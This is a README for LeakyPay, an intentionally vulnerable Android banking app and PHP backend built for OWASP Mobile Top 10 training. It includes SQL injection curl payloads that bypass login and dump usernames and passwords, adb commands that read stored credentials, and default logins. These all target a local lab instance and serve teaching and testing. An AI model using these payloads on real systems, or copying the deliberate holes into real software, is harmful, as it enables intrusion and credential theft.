# LeakyPay - Intentionally Vulnerable Mobile Banking App

An intentionally vulnerable Android banking application with PHP/MySQL backend, designed for security training and education. LeakyPay demonstrates common mobile and web security flaws in a safe, controlled environment.

## ⚠️ CRITICAL SECURITY WARNING

**THIS APPLICATION CONTAINS INTENTIONAL SECURITY VULNERABILITIES FOR EDUCATIONAL PURPOSES ONLY.**

- **DO NOT** deploy this application in any production environment
- **DO NOT** expose this application to the public internet
- **DO NOT** use any code from this project in real applications
- This is a **DEFENSIVE SECURITY TRAINING TOOL** only

## Overview

This project demonstrates the **OWASP Mobile Top 10 2021** vulnerabilities (M1-M5):

1. **M1: Improper Platform Usage** - Exported Android components without proper authorization
2. **M2: Insecure Data Storage** - Plaintext credentials, insecure backups, logging sensitive data
3. **M3: Insecure Communication** - HTTP traffic, disabled SSL validation, credentials in URLs
4. **M4: Insecure Authentication** - No input validation, weak passwords, no session management
5. **M5: Insufficient Cryptography** - Hardcoded keys, deprecated algorithms, weak RNG

Additionally, the backend API demonstrates common web vulnerabilities:
- SQL Injection in all endpoints
- No authentication or authorization
- Information disclosure via error messages
- CSRF vulnerabilities
- Plaintext password storage

## Project Components

### Android Application (android/)
- **Language**: Kotlin
- **Target SDK**: 34 (Android 14)
- **Features**: Login, registration, balance checking, money transfers
- **Vulnerabilities**: All OWASP Mobile Top 10 M1-M5

### Backend API (web/)
- **Language**: PHP 7.4+
- **Database**: MySQL 5.7+
- **Features**: RESTful API for user management and transactions
- **Vulnerabilities**: SQL injection, authentication bypass, information disclosure

## Quick Start

### 1. Setup Backend

```bash
# Navigate to web directory
cd web

# Import database (requires MySQL installed)
mysql -u root -p < database.sql

# Start PHP development server
php -S localhost:80
```

Visit http://localhost to see API documentation.

### 2. Setup Android App

```bash
# Open android folder in Android Studio
cd android

# Or build from command line
./gradlew assembleDebug
./gradlew installDebug
```

**Important**: Update `ApiClient.kt` (line 14) with your backend URL:
- Emulator: Use `http://10.0.2.2` (default, maps to localhost)
- Physical device: Use your computer's local IP (e.g., `http://192.168.1.100`)

**Compilation Notes**: The app has been fixed to compile successfully:
- OkHttp 3.12 API compatibility
- Removed missing launcher icon references
- Suppressed deprecation warnings for intentionally vulnerable code

### 3. Test the Application

Use test credentials:
- Username: `test` | Password: `test`
- Username: `alice` | Password: `password123`
- Username: `admin` | Password: `admin`

## Vulnerability Testing

### Test M1: Improper Platform Usage
```bash
# Launch secret activity without authentication
adb shell am start -a com.vulnerable.app.SECRET_ACTION
```

### Test M2: Insecure Data Storage
```bash
# View stored credentials
adb shell cat /data/data/com.vulnerable.app/shared_prefs/user_prefs.xml

# Monitor logs for sensitive data
adb logcat | grep -E "(MainActivity|ApiClient)"
```

### Test M3: Insecure Communication
```bash
# Use Burp Suite or mitmproxy to intercept HTTP traffic
# Configure Android device to use proxy
# Observe plaintext credentials and data
```

### Test M4: Insecure Authentication
```bash
# SQL injection in login
curl "http://localhost/api/login.php?username=admin'%20OR%20'1'='1&password=anything"

# Access any user's balance without authentication
curl "http://localhost/api/balance.php?username=alice"
```

### Test M5: Insufficient Cryptography
The app uses a hardcoded DES key (`12345678`) with deprecated DES algorithm. Encrypted tokens can be easily decrypted.

## SQL Injection Examples

```bash
# Dump all usernames and passwords
curl "http://localhost/api/login.php?username=admin'%20UNION%20SELECT%20NULL,username,password,NULL,NULL,NULL,NULL%20FROM%20users--&password=x"

# Bypass authentication
curl "http://localhost/api/login.php?username=admin'--&password=anything"

# Extract database version
curl "http://localhost/api/balance.php?username=alice'%20UNION%20SELECT%20@@version--"
```

## File Structure

```
LeakyPay/
├── README.md                           # This file
├── android/                            # Android application
│   ├── app/
│   │   ├── src/main/
│   │   │   ├── java/com/vulnerable/app/
│   │   │   │   ├── MainActivity.kt
│   │   │   │   ├── DashboardActivity.kt
│   │   │   │   ├── SecretActivity.kt
│   │   │   │   ├── ApiClient.kt
│   │   │   │   └── Utils.kt
│   │   │   ├── res/                    # UI layouts
│   │   │   └── AndroidManifest.xml
│   │   └── build.gradle
│   ├── build.gradle
│   └── README.md                       # Android-specific guide
└── web/                                # PHP backend
    ├── api/
    │   ├── login.php
    │   ├── register.php
    │   ├── balance.php
    │   └── transfer.php
    ├── config.php
    ├── database.sql
    ├── index.php
    └── README.md                       # Backend-specific guide
```

## Learning Objectives

This project helps you understand:

1. **How vulnerabilities manifest in mobile applications**
2. **Common mistakes developers make**
3. **How to exploit these vulnerabilities**
4. **Impact of security flaws on users and businesses**
5. **Proper secure coding practices (by seeing what NOT to do)**

## Documentation

### Core Documentation
- **README.md** - This file (project overview)
- **SETUP.md** - Complete installation guide
- **VULNERABILITIES.md** - Catalog of all 36 vulnerabilities
- **QUICK_REFERENCE.md** - Command cheat sheet
- **MOBILE_PENTESTING_GUIDE.md** - Comprehensive guide for pentesting with Frida, Objection, and other tools

### Component-Specific
- **android/README.md** - Detailed Android app documentation
- **web/README.md** - Backend API documentation
- **CLAUDE.md** - Development guide for Claude Code

Each vulnerable code section is marked with `// VULN:` comments explaining:
- What the vulnerability is
- How it can be exploited
- What the security impact is
- Which OWASP category it falls under

## Requirements

### Backend
- PHP 7.4 or higher
- MySQL 5.7 or higher
- Apache/Nginx (optional, PHP built-in server works)

### Android
- Android Studio Arctic Fox or later
- JDK 11 or higher
- Android SDK API 34
- Gradle 8.1+
- Android device or emulator (API 21+)

## Educational Use

This project is suitable for:
- Security training workshops
- Mobile security courses
- Penetration testing practice
- Security awareness demonstrations
- OWASP Mobile Top 10 education
- Secure coding training (showing anti-patterns)

## Secure Alternatives

To see how to implement these features securely:
1. Use HTTPS with certificate pinning (not HTTP)
2. Use Android Keystore for sensitive data (not SharedPreferences)
3. Implement proper authentication with JWT or OAuth
4. Use prepared statements for SQL queries
5. Hash passwords with bcrypt or Argon2
6. Use AES-256 with proper key management (not DES)
7. Validate all input on client AND server
8. Implement proper session management
9. Never log sensitive information
10. Follow OWASP guidelines for mobile and web security

## Contributing

When adding new vulnerabilities:
1. Document with `// VULN:` comments
2. Reference OWASP category
3. Update README files
4. Add exploitation examples
5. Keep the educational purpose clear

## License

This project is for educational purposes only. Use at your own risk.

## Disclaimer

The authors and contributors of this project are not responsible for any misuse of this application. This is a defensive security tool meant for learning in controlled environments only.

---

**Remember**: The goal is to learn about vulnerabilities to build MORE secure applications, not to exploit real systems.
